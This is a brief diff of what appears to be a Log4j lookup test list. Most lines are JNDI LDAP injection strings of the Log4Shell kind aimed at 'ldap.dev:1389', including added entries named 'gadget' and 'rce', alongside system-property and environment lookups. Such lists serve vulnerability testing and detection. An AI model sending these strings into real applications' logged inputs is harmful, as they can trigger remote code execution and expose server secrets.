@@ -1,8 +1,8 @@
 ${sys:java.version}
 ${sys:java.class.path}
-${sys:java.home}
 ${log4j:configLocation}
 ${env:MODE}
 ${jndi:ldap://ldap.dev:1389/a}
-${jndi:ldap://ldap.dev:1389/cn=version,dc=example,dc=org}
-${jndi:ldap://ldap.dev:1389/cn=bogus}
+${jndi:ldap://ldap.dev:1389/cn=version}
+${jndi:ldap://ldap.dev:1389/cn=gadget}
+${jndi:ldap://ldap.dev:1389/cn=rce}
